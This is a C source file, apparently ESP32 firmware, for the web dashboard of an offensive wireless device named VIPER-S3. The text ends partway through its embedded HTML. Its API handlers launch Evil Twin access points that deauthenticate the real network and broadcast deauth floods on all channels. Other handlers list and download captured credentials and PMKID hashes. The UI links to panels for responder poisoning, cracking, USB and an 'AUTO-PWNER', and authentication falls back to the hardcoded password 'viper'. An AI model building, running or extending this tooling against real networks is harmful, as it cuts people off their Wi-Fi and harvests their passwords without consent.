#include "web_dashboard.h"
#include "wifi_engine.h"
#include "storage_manager.h"
#include "camera_engine.h"
#include "responder.h"
#include "crack_engine.h"
#include "protocol_attacks.h"
#include "ble_engine.h"
#include "ir_engine.h"
#include "nfc_engine.h"
#include "usb_engine.h"
#include "ai_engine.h"
#include "attack_orchestrator.h"
#include "esp_http_server.h"
#include "esp_https_server.h"
#include "esp_log.h"
#include "esp_system.h"
#include "esp_timer.h"
#include "esp_heap_caps.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

static const char *TAG = "DASHBOARD";

#define MAX_WS_CLIENTS 8

static httpd_handle_t s_server = NULL;
static int s_ws_fds[MAX_WS_CLIENTS];
static int s_ws_count = 0;
static SemaphoreHandle_t s_ws_mutex = NULL;

#define LOG_BUF_SIZE 16384
static char *s_log_buf = NULL;   /* Allocated from PSRAM at init — saves 16KB internal DRAM */
static size_t s_log_len = 0;

#define API_KEY_MAX_LEN 64
#define DASHBOARD_DEFAULT_PASSWORD "viper"
static char s_api_key[API_KEY_MAX_LEN] = {0};
static bool s_auth_enabled = false;

/* Reject oversized POST bodies before reading */
#define CHECK_CONTENT_LEN(req, buf) \
    do { \
        if ((req)->content_len >= sizeof(buf)) { \
            httpd_resp_set_type((req), "application/json"); \
            httpd_resp_set_status((req), "413 Payload Too Large"); \
            httpd_resp_sendstr((req), "{\"ok\":false,\"error\":\"body too large\"}"); \
            return ESP_OK; \
        } \
    } while (0)

static void load_api_key(void)
{
    uint8_t buf[2048] = {0};
    size_t len = 0;
    if (storage_read_file(FILE_CONFIG, buf, sizeof(buf) - 1, &len) != ESP_OK || len == 0) {
        strncpy(s_api_key, DASHBOARD_DEFAULT_PASSWORD, API_KEY_MAX_LEN - 1);
        s_api_key[API_KEY_MAX_LEN - 1] = '\0';
        s_auth_enabled = true;
        ESP_LOGI(TAG, "Dashboard auth enabled (default password)");
        return;
    }
    buf[len] = '\0';
    char *k = strstr((char *)buf, "\"dashboard_password\":");
    if (!k) {
        strncpy(s_api_key, DASHBOARD_DEFAULT_PASSWORD, API_KEY_MAX_LEN - 1);
        s_api_key[API_KEY_MAX_LEN - 1] = '\0';
        s_auth_enabled = true;
        ESP_LOGI(TAG, "Dashboard auth enabled (no config, using default)");
        return;
    }
    k += 21;
    char *start = strchr(k, '"');
    if (!start) {
        strncpy(s_api_key, DASHBOARD_DEFAULT_PASSWORD, API_KEY_MAX_LEN - 1);
        s_api_key[API_KEY_MAX_LEN - 1] = '\0';
        s_auth_enabled = true;
        ESP_LOGI(TAG, "Dashboard auth enabled (default)");
        return;
    }
    start++;
    char *end = strchr(start, '"');
    if (!end) {
        strncpy(s_api_key, DASHBOARD_DEFAULT_PASSWORD, API_KEY_MAX_LEN - 1);
        s_api_key[API_KEY_MAX_LEN - 1] = '\0';
        s_auth_enabled = true;
        ESP_LOGI(TAG, "Dashboard auth enabled (default)");
        return;
    }
    size_t pwlen = end - start;
    if (pwlen >= API_KEY_MAX_LEN) pwlen = API_KEY_MAX_LEN - 1;
    memcpy(s_api_key, start, pwlen);
    s_api_key[pwlen] = '\0';
    s_auth_enabled = (s_api_key[0] != '\0');
    ESP_LOGI(TAG, "Dashboard auth %s (from config)", s_auth_enabled ? "enabled" : "disabled");
}

static esp_err_t auth_check(httpd_req_t *req)
{
    if (!s_auth_enabled) return ESP_OK;
    char buf[API_KEY_MAX_LEN + 8] = {0};
    size_t len = httpd_req_get_hdr_value_str(req, "X-API-Key", buf, sizeof(buf) - 1);
    
    if (len > 0 && strcmp(buf, s_api_key) == 0) {
        return ESP_OK;
    }
    
    /* Fallback to query parameter for endpoints like /api/report opened in new tabs */
    char query[128] = {0};
    if (httpd_req_get_url_query_str(req, query, sizeof(query)) == ESP_OK) {
        if (httpd_query_key_value(query, "key", buf, sizeof(buf)) == ESP_OK) {
            if (strcmp(buf, s_api_key) == 0) return ESP_OK;
        }
    }

    httpd_resp_set_type(req, "application/json");
    httpd_resp_set_status(req, "401 Unauthorized");
    httpd_resp_sendstr(req, "{\"ok\":false,\"error\":\"unauthorized\"}");
    return ESP_FAIL;
}

/* ── WebSocket helpers ──────────────────────────── */

static void ws_add_client(int fd)
{
    if (s_ws_mutex) xSemaphoreTake(s_ws_mutex, portMAX_DELAY);
    for (int i = 0; i < MAX_WS_CLIENTS; i++) {
        if (s_ws_fds[i] == 0) { s_ws_fds[i] = fd; s_ws_count++; break; }
    }
    if (s_ws_mutex) xSemaphoreGive(s_ws_mutex);
}

static void ws_remove_client(int fd)
{
    if (s_ws_mutex) xSemaphoreTake(s_ws_mutex, portMAX_DELAY);
    for (int i = 0; i < MAX_WS_CLIENTS; i++) {
        if (s_ws_fds[i] == fd) { s_ws_fds[i] = 0; s_ws_count--; break; }
    }
    if (s_ws_mutex) xSemaphoreGive(s_ws_mutex);
}

esp_err_t web_dashboard_broadcast(const char *event_type, const char *json_data)
{
    if (s_ws_count == 0) return ESP_OK;

    char msg[1024];
    int len = snprintf(msg, sizeof(msg), "{\"ev\":\"%s\",\"data\":%s}", event_type, json_data);

    httpd_ws_frame_t ws_msg = {
        .type = HTTPD_WS_TYPE_TEXT,
        .payload = (uint8_t *)msg,
        .len = len,
    };

    if (s_ws_mutex) xSemaphoreTake(s_ws_mutex, portMAX_DELAY);
    for (int i = 0; i < MAX_WS_CLIENTS; i++) {
        if (s_ws_fds[i] != 0) {
            httpd_ws_send_frame_async(s_server, s_ws_fds[i], &ws_msg);
        }
    }
    if (s_ws_mutex) xSemaphoreGive(s_ws_mutex);
    return ESP_OK;
}

static void dashboard_log(const char *fmt, ...)
{
    char line[256];
    va_list args;
    va_start(args, fmt);
    vsnprintf(line, sizeof(line), fmt, args);
    va_end(args);

    if (s_log_buf) {
        size_t llen = strlen(line);
        if (s_log_len + llen + 1 > LOG_BUF_SIZE) {
            size_t remove = s_log_len / 4;
            memmove(s_log_buf, s_log_buf + remove, s_log_len - remove);
            s_log_len -= remove;
        }
        s_log_len += snprintf(s_log_buf + s_log_len, LOG_BUF_SIZE - s_log_len, "%s\n", line);
    }

    web_dashboard_broadcast("log", line);
}

/* ── WS handler ─────────────────────────────────── */

static esp_err_t ws_handler(httpd_req_t *req)
{
    if (req->method == HTTP_GET) {
        int fd = httpd_req_to_sockfd(req);
        ws_add_client(fd);
        ESP_LOGI(TAG, "WS client connected (total: %d)", s_ws_count);
        return ESP_OK;
    }

    httpd_ws_frame_t frame;
    memset(&frame, 0, sizeof(frame));
    frame.type = HTTPD_WS_TYPE_TEXT;
    frame.len = 512;
    uint8_t buf[512];
    frame.payload = buf;

    esp_err_t ret = httpd_ws_recv_frame(req, &frame, 512);
    if (ret != ESP_OK) return ret;

    if (frame.type == HTTPD_WS_TYPE_CLOSE) {
        int fd = httpd_req_to_sockfd(req);
        ws_remove_client(fd);
        ESP_LOGI(TAG, "WS client disconnected (total: %d)", s_ws_count);
    }
    return ESP_OK;
}

/* ── API: Status ────────────────────────────────── */

static esp_err_t api_status_get(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    char buf[512];
    int len = snprintf(buf, sizeof(buf),
        "{\"heap_free\":%lu,\"heap_min\":%lu,\"uptime_ms\":%lld,\"wifi_mode\":%d,\"ws_clients\":%d}",
        esp_get_free_heap_size() / 1024,
        esp_get_minimum_free_heap_size() / 1024,
        esp_timer_get_time() / 1000,
        wifi_engine_get_mode(),
        s_ws_count);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, buf, len);
    return ESP_OK;
}

/* ── API: WiFi Scan ─────────────────────────────── */

static esp_err_t api_scan_get(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    viper_ap_t results[WIFI_MAX_SCAN_RESULTS];
    uint16_t count = WIFI_MAX_SCAN_RESULTS;

    wifi_scan_get_results(results, &count);

    size_t buf_size = count * 256 + 128;
    char *buf = malloc(buf_size);
    if (!buf) {
        httpd_resp_send_500(req);
        return ESP_OK;
    }

    int off = snprintf(buf, buf_size, "{\"count\":%d,\"aps\":[", count);
    for (int i = 0; i < count; i++) {
        char bssid[18];
        wifi_mac_to_str(results[i].bssid, bssid);
        off += snprintf(buf + off, buf_size - off,
            "%c{\"ssid\":\"%s\",\"bssid\":\"%s\",\"ch\":%d,\"rssi\":%d,\"auth\":%d,\"hidden\":%d,\"vendor\":\"%s\"}",
            i > 0 ? ',' : ' ',
            results[i].ssid, bssid,
            results[i].channel, results[i].rssi,
            results[i].authmode, results[i].hidden,
            results[i].oui_vendor);
    }
    off += snprintf(buf + off, buf_size - off, "]}");

    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, buf, off);
    free(buf);
    return ESP_OK;
}

/* ── API: Clients ───────────────────────────────── */

static esp_err_t api_clients_get(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    viper_client_t clients[WIFI_MAX_CLIENTS];
    uint16_t count = WIFI_MAX_CLIENTS;

    wifi_scan_get_clients(clients, &count);

    size_t bs = 4096;
    char *buf = malloc(bs);
    if (!buf) { httpd_resp_send_500(req); return ESP_OK; }
    int off = snprintf(buf, bs, "{\"count\":%d,\"clients\":[", count);
    for (int i = 0; i < count; i++) {
        char mac[18];
        wifi_mac_to_str(clients[i].mac, mac);
        off += snprintf(buf + off, bs - off,
            "%c{\"mac\":\"%s\",\"rssi\":%d,\"vendor\":\"%s\"}",
            i > 0 ? ',' : ' ', mac, clients[i].rssi, clients[i].oui_vendor);
    }
    off += snprintf(buf + off, bs - off, "]}");

    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, buf, off);
    free(buf);
    return ESP_OK;
}

/* ── API: Attack Control ────────────────────────── */

static esp_err_t api_attack_start(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    char buf[256];
    int len = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (len <= 0) { httpd_resp_send_500(req); return ESP_OK; }
    buf[len] = '\0';

    int mode = 0;
    char ssid[33] = {0};

    if (strstr(buf, "\"mode\":2")) mode = 2;
    else if (strstr(buf, "\"mode\":3")) mode = 3;
    else if (strstr(buf, "\"mode\":4")) mode = 4;
    else if (strstr(buf, "\"mode\":1")) mode = 1;

    const char *ss = strstr(buf, "\"ssid\"");
    if (ss) {
        ss = strchr(ss + 7, '"');
        if (ss) {
            ss++;
            int si = 0;
            while (*ss && *ss != '"' && si < 32) ssid[si++] = *ss++;
        }
    }

    wifi_engine_stop_current();
    wifi_attack_mode_t m = (wifi_attack_mode_t)mode;
    wifi_engine_set_mode(m);

    switch (m) {
        case WIFI_MODE_SCANNER:
            dashboard_log("Starting WiFi scan...");
            wifi_scan_start();
            break;
        case WIFI_MODE_EVIL_TWIN:
            dashboard_log("Starting Evil Twin: %s", ssid[0] ? ssid : "AndroidAP_3F7A");
            evil_twin_cfg_t etc = {
                .authmode = WIFI_AUTH_OPEN,
                .channel = 6,
                .deauth_legit = true,
            };
            strncpy(etc.ssid, ssid[0] ? ssid : "AndroidAP_3F7A", sizeof(etc.ssid) - 1);
            wifi_eviltwin_start(&etc);
            break;
        case WIFI_MODE_DEAUTH:
            dashboard_log("Starting deauth broadcast...");
            wifi_deauth_all(100, 10000);
            break;
        default:
            dashboard_log("Unknown attack mode: %d", mode);
            break;
    }

    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    return ESP_OK;
}

static esp_err_t api_attack_stop(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    wifi_engine_stop_current();
    dashboard_log("Attack stopped");
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    return ESP_OK;
}

/* ── API: Captures ──────────────────────────────── */

/* Convert JSONL (newline-delimited JSON objects) to a JSON array in-place.
 * Returns the number of entries found. Writes into out (size out_size). */
static int jsonl_to_json_array(const char *jsonl, char *out, size_t out_size)
{
    int count = 0;
    size_t off = 0;
    off += snprintf(out + off, out_size - off, "[");

    const char *p = jsonl;
    while (p && *p) {
        /* Skip blank lines */
        while (*p == '\n' || *p == '\r') p++;
        if (!*p) break;

        /* Find end of this JSONL line */
        const char *eol = strpbrk(p, "\n\r");
        size_t line_len = eol ? (size_t)(eol - p) : strlen(p);
        if (line_len == 0) { p = eol ? eol + 1 : NULL; continue; }

        if (count > 0 && off < out_size - 1)
            out[off++] = ',';

        size_t copy = (off + line_len < out_size - 2) ? line_len : out_size - off - 2;
        memcpy(out + off, p, copy);
        off += copy;
        count++;

        p = eol ? eol + 1 : NULL;
    }

    if (off < out_size - 1) out[off++] = ']';
    if (off < out_size)     out[off]   = '\0';
    return count;
}

static esp_err_t api_captures_creds(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    char *buf = malloc(8192);
    if (!buf) { httpd_resp_send_500(req); return ESP_OK; }
    size_t len = 0;
    esp_err_t ret = storage_read_file(FILE_CREDS, (uint8_t *)buf, 8191, &len);
    if (ret != ESP_OK || len == 0) {
        free(buf);
        httpd_resp_set_type(req, "application/json");
        httpd_resp_sendstr(req, "{\"count\":0,\"entries\":[]}");
        return ESP_OK;
    }
    buf[len] = '\0';

    /* Convert JSONL → JSON array */
    char *arr = malloc(len + 32);
    if (!arr) { free(buf); httpd_resp_send_500(req); return ESP_OK; }
    int count = jsonl_to_json_array(buf, arr, len + 32);

    char *resp = malloc(len + 64);
    if (!resp) { free(arr); free(buf); httpd_resp_send_500(req); return ESP_OK; }
    int rlen = snprintf(resp, len + 64, "{\"count\":%d,\"entries\":%s}", count, arr);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, resp, rlen);
    free(resp);
    free(arr);
    free(buf);
    return ESP_OK;
}

static esp_err_t api_captures_hashes(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    char *buf = malloc(8192);
    if (!buf) { httpd_resp_send_500(req); return ESP_OK; }
    size_t len = 0;
    esp_err_t ret = storage_read_file(FILE_HASHES, (uint8_t *)buf, 8191, &len);
    if (ret != ESP_OK || len == 0) {
        free(buf);
        httpd_resp_set_type(req, "application/json");
        httpd_resp_sendstr(req, "{\"count\":0,\"entries\":[]}");
        return ESP_OK;
    }
    buf[len] = '\0';

    char *arr = malloc(len + 32);
    if (!arr) { free(buf); httpd_resp_send_500(req); return ESP_OK; }
    int count = jsonl_to_json_array(buf, arr, len + 32);

    char *resp = malloc(len + 64);
    if (!resp) { free(arr); free(buf); httpd_resp_send_500(req); return ESP_OK; }
    int rlen = snprintf(resp, len + 64, "{\"count\":%d,\"entries\":%s}", count, arr);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, resp, rlen);
    free(resp);
    free(arr);
    free(buf);
    return ESP_OK;
}

static esp_err_t api_captures_wipe(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    storage_wipe_captures();
    dashboard_log("Captures wiped");
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    return ESP_OK;
}

/* ── API: Logs ──────────────────────────────────── */

static esp_err_t api_logs_get(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    httpd_resp_set_type(req, "text/plain");
    httpd_resp_send(req, s_log_buf ? s_log_buf : "", s_log_buf ? s_log_len : 0);
    return ESP_OK;
}

/* ── API: Config ────────────────────────────────── */

static esp_err_t api_config_get(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    uint8_t buf[2048];
    size_t len = 0;
    esp_err_t ret = storage_read_file(FILE_CONFIG, buf, sizeof(buf) - 1, &len);
    if (ret != ESP_OK) {
        const char *def = "{\"ap_ssid\":\"AndroidAP_3F7A\",\"ap_pass\":\"00000000\",\"ap_ch\":6}";
        httpd_resp_set_type(req, "application/json");
        httpd_resp_send(req, def, strlen(def));
        return ESP_OK;
    }
    buf[len] = '\0';
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, (char *)buf, len);
    return ESP_OK;
}

static esp_err_t api_config_post(httpd_req_t *req)
{
    if (auth_check(req) != ESP_OK) return ESP_OK;
    char buf[2048];
    int len = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (len <= 0) { httpd_resp_send_500(req); return ESP_OK; }
    buf[len] = '\0';

    storage_write_file(FILE_CONFIG, (uint8_t *)buf, len, false);
    dashboard_log("Config updated");
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, "{\"ok\":true}");
    return ESP_OK;
}

/* ── MJPEG Stream ───────────────────────────────── */

static esp_err_t stream_mjpeg(httpd_req_t *req)
{
    httpd_resp_set_type(req, "multipart/x-mixed-replace; boundary=frame");
    httpd_resp_set_hdr(req, "Cache-Control", "no-cache");
    httpd_resp_set_hdr(req, "Connection", "close");
    httpd_resp_set_hdr(req, "Access-Control-Allow-Origin", "*");

    const char *boundary = "--frame\r\nContent-Type: image/jpeg\r\n\r\n";
    const char *end = "\r\n";

    if (camera_engine_is_initialized()) {
        for (int i = 0; i < 300; i++) {
            uint8_t *buf = NULL;
            size_t len = 0;
            int w, h;
            if (camera_engine_capture(&buf, &len, &w, &h) == ESP_OK && buf) {
                httpd_resp_sendstr_chunk(req, boundary);
                httpd_resp_send_chunk(req, (char *)buf, len);
                httpd_resp_sendstr_chunk(req, end);
                free(buf);
            }
            vTaskDelay(pdMS_TO_TICKS(50));
        }
    } else {
        for (int i = 0; i < 10; i++) {
            if (httpd_resp_sendstr_chunk(req, boundary) != ESP_OK) break;
            httpd_resp_sendstr_chunk(req, end);
            vTaskDelay(pdMS_TO_TICKS(200));
        }
    }

    httpd_resp_sendstr_chunk(req, NULL);
    return ESP_OK;
}

/* ── Files from flash ───────────────────────────── */

static esp_err_t serve_file(httpd_req_t *req, const char *path, const char *mime)
{
    uint8_t *buf = malloc(4096);
    if (!buf) { httpd_resp_send_500(req); return ESP_OK; }

    size_t len = 0;
    if (storage_read_file(path, buf, 4095, &len) != ESP_OK) {
        free(buf);
        httpd_resp_send_404(req);
        return ESP_OK;
    }
    buf[len] = '\0';
    httpd_resp_set_type(req, mime);
    httpd_resp_send(req, (char *)buf, len);
    free(buf);
    return ESP_OK;
}

static esp_err_t download_handler(httpd_req_t *req)
{
    char qbuf[64] = "";
    const char *type = qbuf;
    if (httpd_req_get_url_query_str(req, qbuf, sizeof(qbuf)) == ESP_OK) {
        type = qbuf;
    }
    if (strcmp(type, "creds") == 0) return serve_file(req, FILE_CREDS, "application/json");
    if (strcmp(type, "hashes") == 0) return serve_file(req, FILE_HASHES, "application/json");
    if (strcmp(type, "all") == 0) {
        char buf[256];
        int len = snprintf(buf, sizeof(buf),
            "Export not yet implemented.\n"
            "Files available:\n  %s\n  %s\n",
            FILE_CREDS, FILE_HASHES);
        httpd_resp_set_type(req, "text/plain");
        httpd_resp_send(req, buf, len);
        return ESP_OK;
    }
    httpd_resp_send_404(req);
    return ESP_OK;
}

/* ── Dashboard HTML ─────────────────────────────── */

static const char DASHBOARD_HTML[] =
    "<!DOCTYPE html>"
    "<html lang='en'>"
    "<head>"
    "<meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>VIPER-S3 Dashboard</title>"
    "<style>"
    "*{margin:0;padding:0;box-sizing:border-box}"
    "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0e17;color:#e0e0e0;min-height:100vh}"
    ".header{background:linear-gradient(135deg,#0f1923,#1a2a3a);padding:16px 24px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #2a3a4a;flex-wrap:wrap;gap:12px}"
    ".header h1{font-size:20px;font-weight:600;color:#00d4aa}"
    ".header h1 span{color:#ff4444}"
    ".header .status{font-size:12px;color:#888}"
    ".header .status .dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:6px;background:#00d4aa;animation:pulse 2s infinite}"
    "@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}"
    ".nav{display:flex;background:#111b24;border-bottom:1px solid #1a2a3a;overflow-x:auto;padding:0 8px}"
    ".nav a{color:#888;text-decoration:none;padding:12px 16px;font-size:13px;white-space:nowrap;border-bottom:2px solid transparent;transition:all .2s}"
    ".nav a:hover{color:#fff;background:#1a2a3a}"
    ".nav a.active{color:#00d4aa;border-bottom-color:#00d4aa}"
    ".main{padding:16px;max-width:1200px;margin:0 auto}"
    ".panel{display:none}"
    ".panel.active{display:block}"
    ".cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px;margin-bottom:20px}"
    ".card{background:#111b24;border:1px solid #1a2a3a;border-radius:8px;padding:16px}"
    ".card h3{font-size:12px;color:#888;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px}"
    ".card .value{font-size:28px;font-weight:700;color:#fff}"
    ".card .value.green{color:#00d4aa}"
    ".card .value.red{color:#ff4444}"
    ".card .value.blue{color:#4488ff}"
    ".card .value.yellow{color:#ffaa00}"
    "table{width:100%;border-collapse:collapse;font-size:13px}"
    "th,td{padding:8px 12px;text-align:left;border-bottom:1px solid #1a2a3a}"
    "th{color:#888;font-size:11px;text-transform:uppercase;letter-spacing:1px}"
    "td{color:#ccc;font-family:'SF Mono','Fira Code','Courier New',monospace;font-size:12px}"
    "tr:hover{background:#1a2a3a}"
    ".badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:10px;font-weight:600;text-transform:uppercase}"
    ".badge.open{background:#1a3a2a;color:#00d4aa}"
    ".badge.wpa2{background:#3a2a1a;color:#ffaa00}"
    ".badge.wpa3{background:#2a1a3a;color:#aa88ff}"
    ".btn{display:inline-block;padding:8px 16px;border:none;border-radius:6px;font-size:13px;font-weight:600;cursor:pointer;transition:all .2s;margin:2px}"
    ".btn-primary{background:#00d4aa;color:#0a0e17}"
    ".btn-primary:hover{background:#00ffcc}"
    ".btn-danger{background:#ff4444;color:#fff}"
    ".btn-danger:hover{background:#ff6666}"
    ".btn-warn{background:#ffaa00;color:#0a0e17}"
    ".btn-warn:hover{background:#ffcc44}"
    ".btn-sm{padding:4px 10px;font-size:11px}"
    ".form-group{margin-bottom:12px}"
    ".form-group label{display:block;font-size:12px;color:#888;margin-bottom:4px}"
    ".form-group input,.form-group select{width:100%;padding:8px 12px;background:#0a0e17;border:1px solid #2a3a4a;border-radius:4px;color:#e0e0e0;font-size:14px}"
    ".form-group input:focus,.form-group select:focus{outline:none;border-color:#00d4aa}"
    ".log-viewer{background:#050810;border:1px solid #1a2a3a;border-radius:8px;padding:12px;font-family:'SF Mono','Fira Code',monospace;font-size:11px;height:400px;overflow-y:auto;white-space:pre-wrap;line-height:1.6}"
    ".log-viewer .info{color:#888}"
    ".log-viewer .warn{color:#ffaa00}"
    ".log-viewer .error{color:#ff4444}"
    ".log-viewer .cred{color:#00ff88;font-weight:700}"
    ".empty{text-align:center;padding:40px;color:#555;font-size:14px}"
    ".capture-entry{background:#111b24;border:1px solid #1a2a3a;border-radius:6px;padding:12px;margin-bottom:8px;font-size:12px}"
    ".capture-entry .src{color:#4488ff;font-weight:600}"
    ".capture-entry .ts{color:#555;float:right}"
    ".capture-entry .user{color:#00d4aa}"
    ".capture-entry .pass{color:#ff4444}"
    ".modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.7);z-index:1000;justify-content:center;align-items:center}"
    ".modal.active{display:flex}"
    ".modal-content{background:#1a2a3a;border-radius:12px;padding:24px;max-width:480px;width:90%;max-height:80vh;overflow-y:auto}"
    ".modal-content h2{color:#00d4aa;margin-bottom:16px}"
    "@media(max-width:600px){.header h1{font-size:16px}.cards{grid-template-columns:1fr 1fr}.nav a{padding:10px 12px;font-size:12px}}"
    ".step-badge{padding:6px 12px;border-radius:20px;font-size:11px;font-weight:600;background:#1a2a3a;color:#555;border:1px solid #2a3a4a;transition:all .3s}"
    ".step-badge.active{background:#3a1a00;color:#ffaa00;border-color:#ffaa00;box-shadow:0 0 8px rgba(255,170,0,.3);animation:stepPulse 1s infinite}"
    ".step-badge.done{background:#0a2a1a;color:#00d4aa;border-color:#00d4aa}"
    ".step-badge.cracked{background:#2a0a0a;color:#ff4444;border-color:#ff4444;box-shadow:0 0 12px rgba(255,68,68,.4);animation:stepPulse .5s infinite}"
    "@keyframes stepPulse{0%,100%{opacity:1}50%{opacity:.6}}"
    "</style></head><body>"
    "<div class='header'>"
    "<h1>VIPER<span>-S3</span></h1>"
    "<div class='status'><span class='dot'></span><span id='statusText'>Online</span> &middot; <span id='heapText'>0</span> KB free</div>"
    "</div>"
    "<div class='nav' id='nav'>"
    "<a href='#' class='active' data-panel='overview' onclick='return switchPanel(\"overview\")'>Overview</a>"
    "<a href='#' data-panel='wifi' onclick='return switchPanel(\"wifi\")'>WiFi</a>"
    "<a href='#' data-panel='attacks' onclick='return switchPanel(\"attacks\")'>Attacks</a>"
    "<a href='#' data-panel='captures' onclick='return switchPanel(\"captures\")'>Captures</a>"
    "<a href='#' data-panel='camera' onclick='return switchPanel(\"camera\")'>Camera</a>"
    "<a href='#' data-panel='logs' onclick='return switchPanel(\"logs\")'>Logs</a>"
    "<a href='#' data-panel='ble' onclick='return switchPanel(\"ble\")'>BLE</a>"
    "<a href='#' data-panel='config' onclick='return switchPanel(\"config\")'>Config</a>"
    "<a href='#' data-panel='responder' onclick='return switchPanel(\"responder\")'>Responder</a>"
    "<a href='#' data-panel='crack' onclick='return switchPanel(\"crack\")'>Crack</a>"
    "<a href='#' data-panel='ir' onclick='return switchPanel(\"ir\")'>IR</a>"
    "<a href='#' data-panel='nfc' onclick='return switchPanel(\"nfc\")'>NFC</a>"
    "<a href='#' data-panel='protocol' onclick='return switchPanel(\"protocol\")'>Protocol</a>"
    "<a href='#' data-panel='usb' onclick='return switchPanel(\"usb\")'>USB</a>"
    "<a href='#' data-panel='ai' onclick='return switchPanel(\"ai\")'>AI</a>"
    "<a href='#' data-panel='orchestrator' onclick='return switchPanel(\"orchestrator\")'>Orch</a>"
    "<a href='#' data-panel='autopwn' onclick='return switchPanel(\"autopwn\")' style='color:#ff4444;font-weight:700'>&#x26A1; AUTO-PWNER</a>"
    "<a href='#' data-panel='map' onclick='return switchPanel(\"map\")'>&#x1f5fa; Map</a>"
    "<a href='#' onclick='window.open(\"/api/report?key=\"+(localStorage.getItem(\"viper_key\")||\"viper\"));return false;' style='color:#ffaa00'>&#x1f4cb; Report</a>"
    "</div>"
    "<div class='main' id='main'>"
    "<div class='panel active' id='panel-overview'>"
    "<div class='cards' id='statusCards'>"
    "<div class='card'><h3>Heap Free</h3><div class='value green' id='heapVal'>0 KB</div></div>"
    "<div class='card'><h3>WiFi Mode</h3><div class='value blue' id='wifiModeVal'>Idle</div></div>"
    "<div class='card'><h3>WS Clients</h3><div class='value yellow' id='wsClientsVal'>0</div></div>"
    "<div class='card'><h3>Uptime</h3><div class='value' id='uptimeVal'>0s</div></div>"
    "<div class='card'><h3>JS Status</h3><div class='value green' id='jsStatus'>Waiting...</div></div>"
    "</div>"
    "<div class='card'><h3>Recent Activity</h3><div class='log-viewer' id='activityLog'><div class='info'>Waiting for events...</div></div></div>"
    "</div>"
    "<div class='panel' id='panel-wifi'><div class='card'><h3>Access Points</h3><div style='margin:8px 0'><button class='btn btn-primary btn-sm' onclick='scanWifi()'>Scan Now</button></div><div id='scanResults' style='overflow-x:auto'><div class='empty'>Click &quot;Scan Now&quot; to start</div></div></div></div>"
    "<div class='panel' id='panel-attacks'>"
    "<div class='cards'>"
    "<div class='card'><h3>Evil Twin</h3><div class='form-group'><label>SSID</label><input id='etSsid' value='AndroidAP_3F7A'></div><div class='form-group'><label>Channel</label><select id='etCh'><option>1</option><option>6</option><option>11</option></select></div><button class='btn btn-primary btn-sm' onclick='startEvilTwin()'>Start Evil Twin</button></div>"
    "<div class='card'><h3>Deauth</h3><p style='color:#888;font-size:12px;margin-bottom:8px'>Broadcast deauth on all channels</p><button class='btn btn-danger btn-sm' onclick='startDeauth()'>Start Deauth</button></div>"
    "<div class='card'><h3>Stop All</h3><p style='color:#888;font-size:12px;margin-bottom:8px'>Stop all active attacks</p><button class='btn btn-warn btn-sm' onclick='stopAttack()'>Stop</button></div>"
    "</div>"
    "<div class='card'><h3>Attack Log</h3><div class='log-viewer' id='attackLog'><div class='info'>No attacks running</div></div></div>"
    "</div>"
    "<div class='panel' id='panel-captures'>"
    "<div class='card'><h3>Credentials</h3><div style='margin:8px 0'><button class='btn btn-danger btn-sm' onclick='wipeCaptures()'>Wipe All</button></div><div id='credsList'><div class='empty'>No credentials captured yet</div></div></div>"
    "<div class='card' style='margin-top:12px'><h3>PMKID Hashes</h3><div id='hashesList'><div class='empty'>No hashes captured yet</div></div></div>"
    "</div>"
    "<div class='panel' id='panel-camera'>"
    "<div class='card'><h3>Live Feed</h3><div style='text-align:center;padding:40px;color:#555'><p>Camera module not active</p><p style='font-size:12px;margin-top:8px'>MJPEG stream will appear here when camera is initialized</p></div></div>"
    "</div>"
    "<div class='panel' id='panel-logs'>"
    "<div class='card'><h3>System Log</h3><button class='btn btn-sm btn-warn' onclick='document.getElementById(\"sysLog\").textContent=\"\"' style='margin-bottom:8px'>Clear</button><div class='log-viewer' id='sysLog'><div class='info'>Connecting...</div></div></div>"
    "</div>"
    "<div class='panel' id='panel-ble'>"
    "<div class='cards'>"
    "<div class='card'><h3>Proprietary Scan Results</h3><button class='btn btn-primary btn-sm' onclick='refreshProprietary()'>Refresh</button><div id='propResults' style='margin-top:8px;overflow-x:auto'><div class='empty'>No proprietary devices found</div></div></div>"
